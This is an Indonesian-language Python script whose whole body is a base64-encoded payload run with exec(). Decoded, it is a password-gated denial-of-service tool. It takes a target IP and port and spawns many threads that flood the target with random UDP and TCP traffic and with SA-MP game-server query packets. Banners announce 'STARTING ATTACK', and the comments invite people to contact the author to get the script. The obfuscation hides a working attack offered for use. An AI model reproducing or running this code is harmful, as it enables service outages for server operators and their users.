#Nyari Pw Ya? Awokawokaowk Ga Ada Disini Om Pw Nya
#Mau Ambil Sc? Hubungi Pablo:v
import base64 
exec(base64.b64decode("aW1wb3J0IHJhbmRvbQppbXBvcnQgc29ja2V0CmltcG9ydCBzdHJ1Y3QKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgb3Msc3lzCmltcG9ydCByYW5kb20sIHNvY2tldCwgdGhyZWFkaW5nCmltcG9ydCBjb2RlY3MKZnJvbSBnZXRwYXNzIGltcG9ydCBnZXRwYXNzCiNUaW1lCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCm5vdyA9IGRhdGV0aW1lLm5vdygpCmhvdXIgPSBub3cuaG91cgptaW51dGVzID0gbm93Lm1pbnV0ZQpkYXkgPSBub3cuZGF5Cm1vbnRoID0gbm93Lm1vbnRoCnllYXIgPSBub3cueWVhcgoKcGFzdyA9ICJkZG9zIgoKb3Muc3lzdGVtKCJjbGVhciIpCmZvciBpIGluIHJhbmdlKDMpOgogICAgcHJpbnQoIiBUaXBzIDogVGVrcyBQYXNzd29yZCBUaWRhayBBa2FuIFRlcmxpaGF0IikKICAgIHByaW50KCIgQ2x1ZSBQdyA6IEJlcmthaXRhbiBEZW5nYW4gVG9vbHMiKQogICAgcHdkID0gZ2V0cGFzcygiIFBhc3N3b3JkIDogIikKICAgIGogPSAzCiAgICBpZiAocHdkID09IHBhc3cpOgogICAgICAgIHRpbWUuc2xlZXAoLjMpCiAgICAgICAgcHJpbnQoIiBcMDMzWzE7MzI7NDBtQ29ycmVudCIpCiAgICAgICAgdGltZS5zbGVlcCguOSkKICAgICAgICBwcmludCgiXDAzM1sxOzMyOzQwbSBNRU5ZQUxBS0FOIFNFUlZFUiIpCiAgICAgICAgdGltZS5zbGVlcCguMikKICAgICAgICBicmVhawogICAgZWxzZToKICAgICAgICB0aW1lLnNsZWVwKC40KQogICAgICAgIHByaW50KCJcMDMzWzE7MzE7NDBtIFBhc3N3b3JkIFdyb25nIFxuIikKICAgICAgICBjb250aW51ZQp0aW1lLnNsZWVwKC43KQpwcmludCgiXDAzM1sxOzM2OzQwbSBCZXJoYXNpbCBMb2dpbiBLZSBTZXJ2ZXIiKQp0aW1lLnNsZWVwKC45KQoKb3Muc3lzdGVtKCJjbGVhciIpCgpwcmludCgiXDAzM1szMm0gTG9hZGluZyIpCnRpbWUuc2xlZXAoMSkKb3Muc3lzdGVtKCJjbGVhciIpCnByaW50KCIgTG9hZGluZy4iKQp0aW1lLnNsZWVwKDEpCm9zLnN5c3RlbSgiY2xlYXIiKQpwcmludCgiIExvYWRpbmcuLiIpCnRpbWUuc2xlZXAoMSkKb3Muc3lzdGVtKCJjbGVhciIpCnByaW50KCIgTG9hZGluZy4uLiIpCnRpbWUuc2xlZXAoMSkKb3Muc3lzdGVtKCJjbGVhciIpCnByaW50KCIgTG9hZGluZy4iKQp0aW1lLnNsZWVwKDEpCm9zLnN5c3RlbSgiY2xlYXIiKQpwcmludCgiIExvYWRpbmcuLiIpCnRpbWUuc2xlZXAoMSkKb3Muc3lzdGVtKCJjbGVhciIpCnByaW50KCIgTG9hZGluZy4uLiIpCnRpbWUuc2xlZXAoMSkKcHJpbnQoIiBCZXJoYXNpbCBMb2dpbiIpCnRpbWUuc2xlZXAoMSkKb3Muc3lzdGVtKCJjbGVhciIpCnByaW50KCIiIlwwMzNbMzNtCiBDcmVkaXRzIEJhbm5lcnMgOiBCYXJhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuIiItLS4uX18KICAgICAgICAgICAgICAgICAgICAgICBfICAgICAgICAgICAgICAgICAgICAgW10gICAgICAgYGAtLi5fCiAgICAgICAgICAgICAgICAgICAgLidgIGAnLiAgICAgICAgICAgICAgICAgIHx8X18gICAgICAgICAgIGAtLl8KICAgICAgICAgICAgICAgICAgIC8gICAgLC0uXCAgICAgICAgICAgICAgICAgfHxfIGBgYC0tLS4uX18gICAgIGAtLgogICAgICAgICAgICAgICAgICAvICAgIC86OjpcXCAgICAgICAgICAgICAgIC98Ly99ICAgICAgICAgIGBgLS0uXyAgYC4KICAgICAgICAgICAgICAgICAgfCAgICB8Ojo6fHwgICAgICAgICAgICAgIHwvLy8vfSAgICAgICAgICAgICAgICBgLS4gCiAgICAgICAgICAgICAgICAgIHwgICAgfDo6Onx8ICAgICAgICAgICAgIC8vJy8vLyAgICAgICAgICAgICAgICAgICAgYC4KICAgICAgICAgICAgICAgICAgfCAgICB8Ojo6fHwgICAgICAgICAgICAvLyAgfHwnICAgICAgICAgICAgICAgICAgICAgIGB8CiAgICAgICAgICAgICAgICAgIC8gICAgfDo6OnwvICAgICAgICBfLC0vL1wgIHx8CiAgICAgICAgICAgICAgICAgL2AgICAgfDo6OnxgLSxfXywtJ2AgIHwvICBcIHx8CiAgICAgICAgICAgICAgIC9gICB8ICAgfCcnIHx8ICAgICAgICAgICBcICAgfHx8CiAgICAgICAgICAgICAvYCAgICBcICAgfCAgIHx8ICAgICAgICAgICAgfCAgL3x8CiAgICAgICAgICAgfGAgICAgICAgfCAgfCAgIHwpICAgICAgICAgICAgXCB8IHx8CiAgICAgICAgICB8ICAgICAgICAgIFwgfCAgIC8gICAgICAsLl9fICAgIFx8IHx8CiAgICAgICAgICAvICAgICAgICAgICBgICAgICAgICAgL2AgICAgYFwgICB8IHx8CiAgICAgICAgIHwgICAgICAgICAgICAgICAgICAgICAvICAgICAgICBcICAvIHx8CiAgICAgICAgIHwgICAgICAgICAgICAgICAgICAgICB8ICAgICAgICB8IC8gIHx8CiAgICAgICAgIC8gICAgICAgICAvICAgICAgICAgICB8ICAgICAgICBgKCAgIHx8CiAgICAgICAgLyAgICAgICAgICAuICAgICAgICAgICAvICAgICAgICAgICkgIHx8CiAgICAgICB8ICAgICAgICAgICAgXCAgICAgICAgICB8ICAgICBfX19fX19fX3x8CiAgICAgIC8gICAgICAgICAgICAgfCAgICAgICAgICAvICAgICBgLS0tLS0tLS58CiAgICAgfFwgICAgICAgICAgICAvICAgICAgICAgIHwgICAgICAgICAgICAgIHx8CiAgICAgXC9gLS5fICAgICAgIHwgICAgICAgICAgIC8gICAgICAgICAgICAgIHx8CiAgICAgIC8vICAgYC4gICAgL2AgICAgICAgICAgIHwgICAgICAgICAgICAgIHx8CiAgICAgLy9gLiAgICBgLiB8ICAgICAgICAgICAgIFwgICAgICAgICAgICAgIHx8CiAgICAvLy9cIGAtLl8gICkvICAgICAgICAgICAgIHwgICAgICAgICAgICAgIHx8CiAgIC8vLy8gKSAgIC4oLyAgICAgICAgICAgICAgIHwgICAgICAgICAgICAgIHx8CiAgIHx8fHwgICAsJ2AgKSAgICAgICAgICAgICAgIC8gICAgICAgICAgICAgIC8vCiAgIHx8fHwgIC8gICAgICAgICAgICAgICAgICAgIC8gICAgICAgICAgICAgfHwgCiAgIGBcXGAgL2AgICAgICAgICAgICAgICAgICAgIHwgICAgICAgICAgICAgLy8gCiAgICAgICB8YCAgICAgICAgICAgICAgICAgICAgIFwgICAgICAgICAgICB8fCAgCiAgICAgIC8gICAgICAgICAgICAgICAgICAgICAgICB8ICAgICAgICAgICAvLyAgCiAgICAvYCAgICAgICAgICAgICAgICAgICAgICAgICAgXCAgICAgICAgIC8vICAgCiAgL2AgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCAgICAgICAgfHwgICAgCiAgYC0uX19fLC0uICAgICAgLi0uICAgICAgICBfX18sJyAgICAgICAgKC8gICAgCiAgICAgICAgICAgYC0tLSdgICAgYCctLS0tJ2AKICAgICAgICAgIiIiKQpwcmludCgiIFZlcnNpb24gSW5mbyBWMS4yIikgICAgICAgICAKcHJpbnQoIiBOb3RlIDogS2xvIEFkYSBCdWcgQXRhdSBObyBEZW1lZyBUdW5nZ3UgQWphIFVwZGF0ZSBTZWxhbmp1dG55YTopIikKcHJpbnQoIiBcMDMzWzMxbURvbid0IEFidXNlIFdpdGggVGhpcyBUb29scyIpCnByaW50KCIgRG9uJ3QgVXNlIE15IFRvb2xzIEZvciBJbGVnYWwgQWN0aXZhdHkiKQpwcmludCgiIFwwMzNbMzJtQXBhcHVuIFlhbmcgQW5kYSBMYWt1a2FuIEl0dSBEaSBUYW5nZ3VuZyBTZW5kaXJpIikKcHJpbnQoIiBDcmVhdG9yIFRpZGFrIEFrYW4gTWVuYW5nZ3VuZzopIikKcHJpbnQoIiBcMDMzWzMzbWh0dHBzOi8vZ2l0aHViLmNvbS9LaW5nQXR0YWNrRXJyb3I0MDQiKQpwcmludCgiIFwwMzNbMzRtaHR0cHM6Ly9zYXdlcmlhLmNvL1BhYmxvQWxsIikKcHJpbnQoIiBcMDMzWzMxbUNvdW50cnkgSUQiKQpwcmludCgiIFwwMzNbMzJtTGFuZ3VhZ2UgSUQvRU4iKQpwcmludCgiIOKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlyIpCnRpbWUuc2xlZXAoMSkKcHJpbnQoIiDilZEgVHV0b3IgbnlhIE5paCEgICAgICAgICAgICAgICAgICAg4pWRIikKdGltZS5zbGVlcCgxKQpwcmludCgiIOKVkSAxLiBNYXN1a2FuIEhvc3QvSVAgU2VydmVyICAgICAgICDilZEiKQp0aW1lLnNsZWVwKDEpCnByaW50KCIg4pWRIDIuIE1hc3VrYW4gUG9ydCA4MC8zMzg5Lzc3NzcvNDMzIeKVkSIpCnRpbWUuc2xlZXAoMSkKcHJpbnQoIiDilZEgMy4gS2xvIFVkYWggRW50ZXI6diAgICAgICAgICAgICAg4pWRIikKdGltZS5zbGVlcCgxKQpwcmludCgiIOKVkSAjUGFibG9UenkgICAgICAgICAgICAgICAgICAgICAgICDilZEiKQp0aW1lLnNsZWVwKDEpCnByaW50KCIg4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIikKcHJpbnQoIiIpCiAgIApwcmludCAoIiBcMDMzWzMxbUVudGVyIElQL0hvc3QiKQppcCA9IHN0cihpbnB1dCgiIElQIDogIikpCgpwcmludCAoIiBFbnRlciBQb3J0IikKcG9ydCA9IGludChpbnB1dCgiIFBvcnQgOiAiKSkKCnByaW50KCJcMDMzWzMybSBHQVNTIEdBPyAoeS9uKSIpCmNob2ljZSA9IHN0cihpbnB1dCgiIHkvbiA6ICIpKQoKUGFjb3RlcyA9IFtjb2RlY3MuZGVjb2RlKCI1MzQxNGQ1MDkwZDkxZDRkNjExZTcwMGE0NjViMDAiLCJoZXhfY29kZWMiKSwjcAogICAgICAgICAgICAgICAgICAgICAgIGNvZGVjcy5kZWNvZGUoIjUzNDE0ZDUwOTUzOGUxYTk2MTFlNjMiLCJoZXhfY29kZWMiKSwjYwogICAgICAgICAgICAgICAgICAgICAgIGNvZGVjcy5kZWNvZGUoIjUzNDE0ZDUwOTUzOGUxYTk2MTFlNjkiLCJoZXhfY29kZWMiKSwjaQogICAgICAgICAgICAgICAgICAgICAgIGNvZGVjcy5kZWNvZGUoIjUzNDE0ZDUwOTUzOGUxYTk2MTFlNzIiLCJoZXhfY29kZWMiKSwjcgogICAgICAgICAgICAgICAgICAgICAgIGNvZGVjcy5kZWNvZGUoIjA4MWU2MmRhIiwiaGV4X2NvZGVjIiksICNjb29raWUgcG9ydCA3Nzk2CiAgICAgICAgICAgICAgICAgICAgICAgY29kZWNzLmRlY29kZSgiMDgxZTc3ZGEiLCJoZXhfY29kZWMiKSwjY29va2llIHBvcnQgNzc3NwogICAgICAgICAgICAgICAgICAgICAgIGNvZGVjcy5kZWNvZGUoIjA4MWU0ZGRhIiwiaGV4X2NvZGVjIiksI2Nvb2tpZSBwb3J0IDc3NzEKICAgICAgICAgICAgICAgICAgICAgICBjb2RlY3MuZGVjb2RlKCIwMjFlZmQ0MCIsImhleF9jb2RlYyIpLCNjb29raWUgcG9ydCA3Nzg0CiAgICAgICAgICAgICAgICAgICAgICAgY29kZWNzLmRlY29kZSgiMDgxZTdlZGEiLCJoZXhfY29kZWMiKSNjb29raWUgcG9ydCA3Nzg0IHRhbWJlbQogICAgICAgICAgICAgICAgICAgICAgIF0gICAKb3Muc3lzdGVtKCJjbGVhciIpCnByaW50ICgiXDAzM1szMW0gICAgICAgICAgICAgICAgICAgICBfX19fX19fX19fX19fX19fX19fX19fX19fXyAiKQpwcmludCAoIiAgICAgICAgICAgICAgICAgICAgIC4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0uICIpCnByaW50ICgiICAgICAgICAgICAgICAgICAgICAvICAgICAgICAgICAgICAgICAgICAgICAgICAgXC4gICIpCnByaW50ICgiICAgICAgICAgICAgICAgICAgICB8ICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgIikKcHJpbnQgKCIgICAgICAgICAgICAgICAgICAgIHwsICAgICAgICAgLi0uICAuLS4gICAgICAgICAsfCIpCnByaW50ICgiICAgICAgICAgICAgICAgICAgICB8LCAgICAgICApKF9fLyAgXF9fKSggICAgICAgLHwiKQpwcmludCAoIiAgICAgICAgICAgICAgICAgICAgfC8gICAgICAgICAgICAvXCAgICAgICAgICAgIFx8IikKcHJpbnQgKCIoQF8gICAgICAgICAgICAgICAgICggXyAgICAgICAgICAgXl4gICAgICAgICAgICBfKSIpCnByaW50ICgiIF8gICAgICkgXF9fX19fX19fX19fX19fX19fX1xfX3xJSUlJSUl8X18vX19fX19fX19fX19fX19fX19fX19fX19fXyIpCnByaW50ICgiKF8pQDhAOHt9PF9fX19fX19fX19fX19fX19fX198LVxJSUlJSUkvLXxfX19fX19fX19fX19fX19fX19fX19fX19fXz4iKQpwcmludCAoIiAgICAgICApXy8gICAgICAgICAgICAgICAgICAgXCAgICAgICAgICAvIikKcHJpbnQgKCIgICAgICAoQCAgICAgICAgICAgICAgICAgICAgICBgLS0tLS0tLS1gICIpCnByaW50KCIiKQpwcmludCgiIENyZWRpdCA6IEJhcmEiKQpwcmludCAoIiBTVEFSVElORyBBVFRBQ0siKQp0aW1lLnNsZWVwKDIpCgpvcy5zeXN0ZW0oImNsZWFyIikKcHJpbnQgKCIgICAgIHxcICAgICAgICAgICAgICAgIHxcICAgICAgICAgICAgICAgIHxcICAgICAgICAgICAgICAgIHxcLiAiKQpwcmludCAoIiAgICAgfHwgLi0tLS4gICAgICAgICAgfHwgLi0tLS4gICAgICAgICAgfHwgLi0tLS4gICAgICAgICAgfHwgLi0tLS4gIikKcHJpbnQgKCIgICAgIHx8L19fX19fXCAgICAgICAgIHx8L19fX19fXCAgICAgICAgIHx8L19fX19fXCAgICAgICAgIHx8L19fX19fXC4gIikKcHJpbnQgKCIgICAgIHx8KCAnLicgKSAgICAgICAgIHx8KCAnLicgKSAgICAgICAgIHx8KCAnLicgKSAgICAgICAgIHx8KCAnLicgKSAiKQpwcmludCAoIiAgICAgfHwgXF/igKJfL18gICAgICAgICB8fCBcXy1fL18gICAgICAgICB8fCBcXy1fL18gICAgICAgICB8fCBcX35fL18gIikKcHJpbnQgKCIgICAtLS0tLS0tLS0tLSAgICAgICAgLS0tLS0tLS0tLS0gICAgICAgLS0tLS0tLS0tLS0gICAgICAgLS0tLS0tLS0tLS0gICAiKQpwcmludCAoIiAgIC8gLCAgIHwvLyAsIGBcICAgIC8gLCAgIHwvLyAsIGBcICAgIC8gLCAgIHwvLyAsIGBcICAgIC8gLCAgIHwvLyAsIGBcLiAiKQpwcmludCAoIiAgLyAvfExsIC8vTGx8fCB8ICAgLyAvfExsIC8vTGx8fCB8ICAgLyAvfExsIC8vTGx8fCB8ICAgLyAvfExsIC8vTGx8fCB8ICIpCnByaW50ICgiIC9fL3x8X18vLyAgIHx8IHwgIC9fL3x8X18vLyAgIHx8IHwgIC9fL3x8X18vLyAgIHx8IHwgIC9fL3x8X18vLyAgIHx8IHwgIikKcHJpbnQgKCIgXCBcLy0tLXxbXT09fHwgfCAgXCBcLy0tLXxbXT09fHwgfCAgXCBcLy0tLXxbXT09fHwgfCAgXCBcLy0tLXxbXT09fHwgfCAiKQpwcmludCAoIiAgXC9cX18vIHwgICBcfCB8ICAgXC9cX18vIHwgICBcfCB8ICAgXC9cX18vIHwgICBcfCB8ICAgXC9cX18vIHwgICBcfCB8ICIpCnByaW50ICgiICAvXHxfICAgfCBMbF9cIHwgICAvfC9fICAgfCBMbF9cIHwgICAvfC9fICAgfCBMbF9cIHwgICAvfC9fICAgfCBMbF9cIHwgIikKcHJpbnQoIiIpCnByaW50KCIgICBDcmVkaXQgOiBCYXJhIikKcHJpbnQoIiAgIE1FTVBFUlNJQVBLQU4gVEVOVEFSQSBVTlRVSyBNRUxVTkNVUktBTiBQQUNLRVQiKQp0aW1lLnNsZWVwKDIuNykKb3Muc3lzdGVtKCJjbGVhciIpICAgICAgICAgICAgICAgICAgICAgICAKCmRlZiB4eHh4eHgoKToKICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKDEwNzk5KQogIGkgPSByYW5kb20uY2hvaWNlKCgiWypdIiwiWyFdIiwiWyNdIikpCiAgd2hpbGUgVHJ1ZToKICAgIHRyeToKICAgICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQogICAgICBhZGRyID0gKHN0cihpcCksaW50KHBvcnQpKQogICAgICBmb3IgeCBpbiByYW5nZSh0aW1lcyk6CiAgICAgICAgcy5zZW5kdG8oZGF0YSxhZGRyKQogICAgICAgIHByaW50KGkgKyIgUEFCTE8gQkVSU0lBUCBNRU5FTUJVUyBGVUNLSU5HIElQID0+ICVzIERFTkdBTiBQT1JUIDogJXMiJShvcmdpcCxwb3J0KSkgCiAgICBleGNlcHQ6CiAgICAgIHByaW50KCJcMDMzWzMzbSBbIV0gXDAzM1szNm1NRUxVTkNVUktBTiBcMDMzWzMxbVBBQ0tFVCIpCgpkZWYgeHh4eHgoKToKICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKDEwMjk5KQogIGkgPSByYW5kb20uY2hvaWNlKCgiWypdIiwiWyFdIiwiWyNdIikpCiAgd2hpbGUgVHJ1ZToKICAgIHRyeToKICAgICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKQogICAgICBhZGRyID0gKHN0cihpcCksaW50KHBvcnQpKQogICAgICBmb3IgeCBpbiByYW5nZSh0aW1lcyk6CiAgICAgICAgcy5zZW5kdG8oZGF0YSxhZGRyKQogICAgICAgIHByaW50KGkgKyIgUEFCTE8gQkVSU0lBUCBNRU5FTUJVUyBGVUNLSU5HIElQID0+ICVzIERFTkdBTiBQT1JUIDogJXMiJShvcmdpcCxwb3J0KSkgCiAgICBleGNlcHQ6CiAgICAgIHByaW50KCJcMDMzWzMzbSBbIV0gXDAzM1szNm1NRUxVTkNVUktBTiBcMDMzWzMxbVBBQ0tFVCIpCgpkZWYgeHh4eCgpOgogIGRhdGEgPSByYW5kb20uX3VyYW5kb20oMTEwNzcpCiAgaSA9IHJhbmRvbS5jaG9pY2UoKCJbKl0iLCJbIV0iLCJbI10iKSkKICB3aGlsZSBUcnVlOgogICAgdHJ5OgogICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCiAgICAgIGFkZHIgPSAoc3RyKGlwKSxpbnQocG9ydCkpCiAgICAgIGZvciB4IGluIHJhbmdlKHRpbWVzKToKICAgICAgICBzLnNlbmR0byhkYXRhLGFkZHIpCiAgICAgICAgcHJpbnQoaSArIiBQQUJMTyBCRVJTSUFQIE1FTkVNQlVTIEZVQ0tJTkcgSVAgPT4gJXMgREVOR0FOIFBPUlQgOiAlcyIlKG9yZ2lwLHBvcnQpKSAKICAgIGV4Y2VwdDoKICAgICAgcHJpbnQoIlwwMzNbMzNtIFshXSBcMDMzWzM2bU1FTFVOQ1VSS0FOIFwwMzNbMzFtUEFDS0VUIikKCmRlZiB4eHgoKToKICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKDMxNjExKQogIGkgPSByYW5kb20uY2hvaWNlKCgiWypdIiwiWyFdIiwiWyNdIikpCiAgd2hpbGUgVHJ1ZToKICAgIHRyeToKICAgICAgcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKICAgICAgcy5jb25uZWN0KChpcCxwb3J0KSkKICAgICAgcy5zZW5kKGRhdGEpCiAgICAgIGZvciB4IGluIHJhbmdlKHRpbWVzKToKICAgICAgICBzLnNlbmQoZGF0YSkKICAgICAgICBwcmludChpICsiIFBBQkxPIEJFUlNJQVAgTUVORU1CVVMgRlVDS0lORyBJUCA9PiAlcyBERU5HQU4gUE9SVCA6ICVzIiUob3JnaXAscG9ydCkpIAogICAgZXhjZXB0OgogICAgICBzLmNsb3NlKCkKICAgICAgcHJpbnQoIlshXSBNQVRJIExVIFNFUlZFUiBOR0VOVE9EIikKCmRlZiB4eCgpOgogIGRhdGEgPSByYW5kb20uX3VyYW5kb20oMTAxNjYpCiAgaSA9IHJhbmRvbS5jaG9pY2UoKCJbKl0iLCJbIV0iLCJbI10iKSkKICB3aGlsZSBUcnVlOgogICAgdHJ5OgogICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgICBzLmNvbm5lY3QoKGlwLHBvcnQpKQogICAgICBzLnNlbmQoZGF0YSkKICAgICAgZm9yIHggaW4gcmFuZ2UodGltZXMpOgogICAgICAgIHMuc2VuZChkYXRhKQogICAgICAgIHByaW50KGkgKyIgUEFCTE8gQkVSU0lBUCBNRU5FTUJVUyBGVUNLSU5HIElQID0+ICVzIERFTkdBTiBQT1JUIDogJXMiJShvcmdpcCxwb3J0KSkgCiAgICBleGNlcHQ6CiAgICAgIHMuY2xvc2UoKQogICAgICBwcmludCgiWyFdIFNFUlZFUiBMRU1BSCBKQU5DT0tLIikKCmRlZiB4KCk6CiAgZGF0YSA9IHJhbmRvbS5fdXJhbmRvbSgxODk0NCkKICBpID0gcmFuZG9tLmNob2ljZSgoIlsqXSIsIlshXSIsIlsjXSIpKQogIHdoaWxlIFRydWU6CiAgICB0cnk6CiAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgIHMuY29ubmVjdCgoaXAscG9ydCkpCiAgICAgIHMuc2VuZChkYXRhKQogICAgICBmb3IgeCBpbiByYW5nZSh0aW1lcyk6CiAgICAgICAgcy5zZW5kKGRhdGEpCiAgICAgICAgcHJpbnQoaSArIiBQQUJMTyBCRVJTSUFQIE1FTkVNQlVTIEZVQ0tJTkcgSVAgPT4gJXMgREVOR0FOIFBPUlQgOiAlcyIlKG9yZ2lwLHBvcnQpKSAKICAgIGV4Y2VwdDoKICAgICAgcy5jbG9zZSgpCiAgICAgIHByaW50KCJbIV0gU0VSVkVSIE1VIExFTUFIIFNFS0FMSSIpCgpmb3IgeSBpbiByYW5nZShwb3J0KToKICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSB4eHh4eHgpCiAgICB0aC5zdGFydCgpCiAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0geHh4eHgpCiAgICB0aC5zdGFydCgpCiAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0geHh4eCkKICAgIHRoLnN0YXJ0KCkKZWxzZToKICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSB4eHgpCiAgICB0aC5zdGFydCgpCiAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0geHgpCiAgICB0aC5zdGFydCgpCiAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0geCkKICAgIHRoLnN0YXJ0KCkKCgoKCgpjbGFzcyBNeVRocmVhZCh0aHJlYWRpbmcuVGhyZWFkKToKICAgICBkZWYgcnVuKHNlbGYpOgogICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgc29jayA9IHNvY2tldC5zb2NrZXQoCiAgICAgICAgICAgICAgICAgICAgc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX0RHUkFNKSAjIEludGVybmV0IGFuZCBVRFAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbXNnID0gUGFjb3Rlc1tyYW5kb20ucmFuZHJhbmdlKDAsMyldCiAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgc29jay5zZW5kdG8obXNnLCAoaXAsIGludChwb3J0KSkpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYoaW50KHBvcnQpID09IDc3NzcpOgogICAgICAgICAgICAgICAgICAgIHNvY2suc2VuZHRvKFBhY290ZXNbNV0sIChpcCwgaW50KHBvcnQpKSkKICAgICAgICAgICAgICAgIGVsaWYoaW50KHBvcnQpID09IDc3OTYpOgogICAgICAgICAgICAgICAgICAgIHNvY2suc2VuZHRvKFBhY290ZXNbNF0sIChpcCwgaW50KHBvcnQpKSkKICAgICAgICAgICAgICAgIGVsaWYoaW50KHBvcnQpID09IDc3NzEpOgogICAgICAgICAgICAgICAgICAgIHNvY2suc2VuZHRvKFBhY290ZXNbNl0sIChpcCwgaW50KHBvcnQpKSkKICAgICAgICAgICAgICAgIGVsaWYoaW50KHBvcnQpID09IDc3ODQpOgogICAgICAgICAgICAgICAgICAgIHNvY2suc2VuZHRvKFBhY290ZXNbN10sIChpcCwgaW50KHBvcnQpKSkKICAgICAgICAgICAgICAgIGVsaWYoaW50KHBvcnQpID09IDExMTEpOgogICAgICAgICAgICAgICAgICAgIHNvY2suc2VuZHRvKFBhY290ZXNbOV0sIChpcCwgaW50KHBvcnQpKSkgICAgCiAgICAgICAgICAgICAgICAKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICB0cnk6CiAgICAgZm9yIHggaW4gcmFuZ2UoMTAwKTogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgbXl0aHJlYWQgPSBNeVRocmVhZCgpICAKICAgICAgICAgICAgbXl0aHJlYWQuc3RhcnQoKSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgdGltZS5zbGVlcCguMSkgICAgCiAgICBleGNlcHQoS2V5Ym9hcmRJbnRlcnJ1cHQpOgogICAgICAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJyk="))     
